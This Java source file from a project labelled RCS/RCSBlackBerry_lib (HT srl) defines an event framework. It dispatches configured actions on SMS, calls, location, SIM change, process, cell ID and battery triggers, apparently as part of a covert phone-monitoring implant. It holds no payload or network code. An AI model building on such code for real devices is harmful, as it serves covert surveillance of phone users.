//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Event.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import blackberry.Status;
import blackberry.action.Action;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.threadpool.TimerJob;


/**
 * The Class Event.
 */
public abstract class Event extends TimerJob {

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("Event", DebugLevel.VERBOSE);
    //#endif

    /** The Constant EVENT. */
    public static final int EVENT = 0x2000;

    /** The Constant EVENT_TIMER. */
    public static final int EVENT_TIMER = EVENT + 0x1;

    /** The Constant EVENT_SMS. */
    public static final int EVENT_SMS = EVENT + 0x2;

    /** The Constant EVENT_CALL. */
    public static final int EVENT_CALL = EVENT + 0x3;

    /** The Constant EVENT_CONNECTION. */
    public static final int EVENT_CONNECTION = EVENT + 0x4;

    /** The Constant EVENT_PROCESS. */
    public static final int EVENT_PROCESS = EVENT + 0x5;

    /** The Constant EVENT_CELLID. */
    public static final int EVENT_CELLID = EVENT + 0x6;

    /** The Constant EVENT_QUOTA. */
    public static final int EVENT_QUOTA = EVENT + 0x7;

    /** The Constant EVENT_SIM_CHANGE. */
    public static final int EVENT_SIM_CHANGE = EVENT + 0x8;

    /** The Constant EVENT_LOCATION. */
    public static final int EVENT_LOCATION = EVENT + 0x9;

    /** The Constant EVENT_AC. */
    public static final int EVENT_AC = EVENT + 0xa;

    /** The Constant EVENT_BATTERY. */
    public static final int EVENT_BATTERY = EVENT + 0xb;

    /** The Constant EVENT_BATTERY. */
    public static final int EVENT_SCREENSAVER = EVENT + 0xc;

    // variables

    /**
     * Factory.
     * 
     * @param eventId
     *            the event id
     * @param eventType
     *            the event type
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     * @return the event
     */
    public static synchronized Event factory(final int eventId,
            final int eventType, final int actionId, final byte[] confParams) {
        Event event = null;

        switch (eventType) {
        case EVENT_TIMER:
            //#ifdef DEBUG
            debug.trace("Factory *** EVENT_TIMER ***");
            //#endif
            event = new TimerEvent(actionId, confParams);
            break;
        case EVENT_SMS:
            //#ifdef DEBUG
            debug.trace("Factory *** EVENT_SMS ***");
            //#endif
            event = new SmsEvent(actionId, confParams);
            break;
        case EVENT_CALL:
            //#ifdef DEBUG
            debug.trace("Factory *** EVENT_CALL ***");
            //#endif
            event = new CallEvent(actionId, confParams);
            break;
        case EVENT_CONNECTION:
            //#ifdef DEBUG
            debug.trace("Factory *** EVENT_CONNECTION ***");
            //#endif
            event = new ConnectionEvent(actionId, confParams);
            break;
        case EVENT_PROCESS:
            //#ifdef DEBUG
            debug.trace("Factory *** EVENT_PROCESS ***");
            //#endif
            event = new ProcessEvent(actionId, confParams);
            break;
        case EVENT_CELLID:
            //#ifdef DEBUG
            debug.trace("Factory *** EVENT_CELLID ***");
            //#endif
            event = new CellIdEvent(actionId, confParams);
            break;
        case EVENT_QUOTA:
            //#ifdef DEBUG
            debug.trace("Factory *** EVENT_QUOTA ***");
            //#endif
            event = new QuotaEvent(actionId, confParams);
            break;
        case EVENT_SIM_CHANGE:
            //#ifdef DEBUG
            debug.trace("Factory *** EVENT_SIM_CHANGE ***");
            //#endif
            event = new SimChangeEvent(actionId, confParams);
            break;
        case EVENT_LOCATION:
            //#ifdef DEBUG
            debug.trace("Factory *** EVENT_LOCATION ***");
            //#endif
            event = new LocationEvent(actionId, confParams);
            break;
        case EVENT_AC:
            //#ifdef DEBUG
            debug.trace("Factory *** EVENT_AC ***");
            //#endif
            event = new AcEvent(actionId, confParams);
            break;
        case EVENT_BATTERY:
            //#ifdef DEBUG
            debug.trace("Factory *** EVENT_BATTERY ***");
            //#endif
            event = new BatteryEvent(actionId, confParams);
            break;
        case EVENT_SCREENSAVER:
            //#ifdef DEBUG
            debug.trace("Factory *** EVENT_SCREENSAVER ***");
            //#endif
            event = new ScreenSaverEvent(actionId, confParams);
            break;
        default:
            //#ifdef DEBUG
            debug.error("Factory Unknown type:" + eventType);
            //#endif
            return null;
        }

        event.eventId = eventId;
        return event;
    }

    /** The Event type. */
    public int eventType = -1;

    /** The Event id. */
    public int eventId = -1;

    /** The Action id. */
    public int actionId = Action.ACTION_UNINIT; // valido, ACTION_NONE, non si
    // rompe.

    /** The status obj. */
    protected Status statusObj = null;

    /**
     * Instantiates a new event.
     * 
     * @param eventType_
     *            the event type_
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    protected Event(final int eventType_, final int actionId_,
            final byte[] confParams, String name) {
        this(eventType_, actionId_, name);
        parse(confParams);
    }

    /**
     * Instantiates a new event.
     * 
     * @param eventType_
     *            the event type_
     * @param actionId_
     *            the action id_
     * @param name
     *            the name
     */
    protected Event(final int eventType_, final int actionId_, final String name) {
        super(name);

        statusObj = Status.getInstance();

        eventType = eventType_;
        actionId = actionId_;

        enable(true);
    }

    /**
     * Parses the.
     * 
     * @param confParams
     *            the conf params
     * @return true, if successful
     */
    protected abstract boolean parse(byte[] confParams);

    //#ifdef DEBUG
    public final String toString() {
        return "Event " + name + ":" + eventType + "|" + eventId;

    }
    //#endif
    
    /**
     * Trigger.
     */
    protected final void trigger() {
        if (actionId != Action.ACTION_NULL) {
            //#ifdef DEBUG
            debug.trace("event: " + this + " triggering: " + actionId);
            //#endif

            statusObj.triggerAction(actionId, this);
        }
    }

    /**
     * Trigger.
     * 
     * @param actualActionId
     *            the actual action id
     */
    protected final void trigger(final int actualActionId) {
        if (actualActionId != Action.ACTION_NULL) {
            //#ifdef DEBUG
            debug.trace("event: " + this + " triggering: " + actualActionId);
            //#endif
            statusObj.triggerAction(actualActionId, this);

        }
    }

    public String getType() {
        // TODO Auto-generated method stub
        return null;
    }

    public int getId() {
        // TODO Auto-generated method stub
        return 0;
    }

}
